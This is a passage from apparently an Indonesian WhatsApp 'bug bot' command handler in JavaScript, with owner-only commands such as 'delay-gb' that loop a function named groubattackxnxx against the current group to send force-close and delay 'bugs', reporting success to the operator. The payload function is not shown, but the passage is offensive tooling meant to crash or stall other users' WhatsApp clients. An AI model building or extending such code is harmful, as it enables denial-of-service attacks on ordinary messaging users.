    await sleep(1000);
    await reaction(m.chat, "✅")
                if (!isOwner) return reply(config.message.owner);
                if (!isGroup) return reply(`Ketiknya Didalam Group Bego`);   
                let jidx = q.replace(/[^0-9]/g, "");
                if (m.chat.startsWith('0')) return reply(`— ex: ${prefix + command} `)             
                let target = `${m.chat}`;
                reply(`success! sent bug to ${target}\n\n*Note* : Jika Bug Tidak Terkirim Kecilkan Lop Agar Tidak Overload.`);              
                for (let i = 0; i < 5; i++) {
                    await groubattackxnxx(target);
                }
            console.log(chalk.red.bold("🩸Success Mengirim Bug FC Kedalam Grup"))
            }
            break;
            
//CASE BUG GRUP DELAY       
case 'delay-gb': {
    await reaction(m.chat, "🕛")
    await sleep(1000);
    await reaction(m.chat, "🕞")
    await sleep(1000);
    await reaction(m.chat, "🕖")
    await sleep(1000);
    await reaction(m.chat, "🕛")
    await sleep(1000);
    await reaction(m.chat, "✅")
                if (!isOwner) return reply(config.message.owner);
                if (!isGroup) return reply(`Ketiknya Didalam Group Bego`);   
                let jidx = q.replace(/[^0-9]/g, "");
                if (m.chat.startsWith('0')) return reply(`— ex: ${prefix + command} `)             
                let target = `${m.chat}`;
                reply(`success! sent bug to ${target}\n\n*Note* : Jika Bug Tidak Terkirim Kecilkan Lop Agar Tidak Overload.`);              
                for (let i = 0; i < 5; i++) {
                    await groubattackxnxx(target);
                }
            console.log(chalk.red.bold("🩸Success Mengirim Bug Delay Kedalam Grup"))
            }
            break;                
            default:
        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})
